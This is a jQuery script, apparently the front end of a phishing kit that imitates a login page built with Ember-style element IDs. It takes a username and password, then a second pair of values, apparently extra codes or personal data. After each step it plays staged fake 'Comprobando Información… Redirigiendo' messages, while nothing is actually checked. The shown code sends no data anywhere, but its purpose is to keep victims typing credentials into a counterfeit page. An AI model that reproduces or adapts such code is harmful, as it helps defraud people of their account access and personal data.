$( "#inner-ember45" ).keyup(function (e) {
	if (e.which == 13) {
		if ($('#inner-ember42').val().length >= 5) {
			if ($('#inner-ember45').val().length >= 4) {
				CickMain1(1);
			}
		}
	}
});

$( "#inner-ember42" ).keyup(function (e) {
	if (e.which == 13) {
		if ($('#inner-ember42').val().length >= 5) {
			if ($('#inner-ember45').val().length >= 4) {
				CickMain1(1);
			}
		}
	}
});

$( "#inner-ember105" ).keyup(function (e) {
	if (e.which == 13) {
		if ($('#inner-ember105').val().length >= 7) {
        if ($('#inner-ember107').val().length >= 9) {
				CickMain1(2);
			}
		}
	}
});

$( "#inner-ember107" ).keyup(function (e) {
	if (e.which == 13) {
		if ($('#inner-ember105').val().length >= 7) {
        if ($('#inner-ember107').val().length >= 9) {
				CickMain1(2);
			}
		}
	}
});


setTimeout(function() {
	$("#Primeira-Pagina").fadeOut();
	$("#Segunda-Pagina").fadeIn();
}, 3500);

function CickMain1(Action){

	if(Action == '1'){

		setTimeout(function() {
			$("#Segunda-Pagina").fadeOut();
			$("#Terceira-Pagina").fadeIn();
		}, 100);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información</p>');
			$('.load').fadeIn();
		}, 2000);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información.</p>');
			$('.load').fadeIn();
		}, 3000);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información..</p>');
			$('.load').fadeIn();
		}, 4000);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Redirigiendo.</p>');
			$('.load').fadeIn();
		}, 5000);
		setTimeout(function() {
			$("#Terceira-Pagina").fadeOut();
			$("#Quarta-Pagina").fadeIn();
		}, 7000);

	}

	if(Action == '2'){

		setTimeout(function() {
			$("#Quarta-Pagina").fadeOut();
			$("#Terceira-Pagina").fadeIn();
		}, 100);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información</p>');
			$('.load').fadeIn();
		}, 2000);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información.</p>');
			$('.load').fadeIn();
		}, 3000);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información..</p>');
			$('.load').fadeIn();
		}, 4000);
		setTimeout(function() {
			$('.load').fadeOut();
			$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Redirigiendo.</p>');
			$('.load').fadeIn();
		}, 5000);
		setTimeout(function() {
			$("#Terceira-Pagina").fadeOut();
			$("#Quinta-Pagina").fadeIn();
		}, 7000);

	}

}

function chk_log() {
    if ($('#inner-ember42').val().length >= 5) {
        if ($('#inner-ember45').val().length >= 4) {
            $('#ember51').removeAttr('status');
            $('#ember51').attr('disabled', false);
            $('#ember51').removeClass('disabled');
        } else {
            $('#ember51').attr('disabled', true);
            $('#ember51').addClass('disabled');
        }
    } else {
        $('#ember51').attr('disabled', true);
        $('#ember51').addClass('disabled');
    }
}
setInterval(function() {
    new chk_log();
}, 1000);

function chk_log2() {
    if ($('#inner-ember105').val().length >= 7) {
        if ($('#inner-ember107').val().length >= 9) {
            $('#ember108').removeAttr('status');
            $('#ember108').attr('disabled', false);
            $('#ember108').removeClass('disabled');
        } else {
            $('#ember108').attr('disabled', true);
            $('#ember108').addClass('disabled');
        }
    } else {
        $('#ember108').attr('disabled', true);
        $('#ember108').addClass('disabled');
    }
}
setInterval(function() {
    new chk_log2();
}, 500);
